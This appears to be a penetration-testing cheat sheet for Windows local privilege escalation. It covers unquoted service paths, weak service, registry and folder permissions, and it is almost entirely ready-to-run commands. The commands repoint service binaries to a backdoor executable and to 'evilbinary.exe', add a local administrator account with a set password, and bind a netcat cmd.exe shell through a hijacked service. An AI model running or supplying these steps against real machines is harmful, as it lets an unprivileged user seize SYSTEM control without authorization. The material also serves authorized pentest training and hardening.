### Unquoted Service Path

Technically Unquoted Service Path vulnerability is caused by the CreateProcess function in Windows operating systems which may allow unprivileged loc users to modify the affected executable file as a system privilege in order to elevate their privileged from unprivilege to system privilged.

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```
If you look at the registry entry for this service with Regedit you can see the ImagePath value is:

C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
When Windows attempts to run this service, it will look at the following paths in order and will run the first EXE that it will find:
```
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\Program.exe
C:\Program Files (x86)\Program Folder\A.exe
C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe
```
If we can drop our malicious exe successfully on one of these paths, upon a restart of the service, Windows will run our exe as SYSTEM.In order to check the permissions of a folder
```
icacls "C:\WeakServices\Weak Service 1\service1.exe"
icacls "C:\WeakServices\Weak Service 1"
icacls "C:\Program Files (x86)\Program Folder"
icacls "C:\Program Files\Photodex\ProShow Producer\Scsiaccess.exe"
```

### Weak Service Permission



```
accesschk.exe -cv MeMe WeakService3
sc config WeakService3 binpath= "C:\Users\MeMe\Desktop\Backdoor.exe" 
sc config WeakService3 binpath= "net user MeMe MeMe@!@#123 /add" 
sc config WeakService3 binpath= "net localgroup Administrators MeMe /add" 

sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost

```
### WEAK REGISTRY PERMISSIONS

```
accexxchk.exe -kvw MeMe HKLM\SYSTEM\CurrentControlSet\Services\

reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f

sc qc WeakService4
sc stop WeakService4
sc start WeakService4

```
### Weak Folder Permissions 
weak folder permissions granting any user full permission "Everyone: (F)" to the contents of the directory and it's sub-folders. In addition, the program installs a service called "KWSService" which runs as "Localsystem", this will allow any user to escalate privileges to "NT AUTHORITY\SYSTEM" by substituting the service's binary with a malicious one
```
icacls c:\kioware_com
C:\kioware_com Everyone:(OI)(CI)(F)
               NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
               BUILTIN\Administrators:(I)(OI)(CI)(F)
               BUILTIN\Users:(I)(OI)(CI)(RX)
               BUILTIN\Users:(I)(CI)(AD)
               BUILTIN\Users:(I)(CI)(WD)
               CREATOR OWNER:(I)(OI)(CI)(IO)(F)
sc qc KWSService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: KWSService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\kioware_com\KWSS.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : KWS Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem               

```
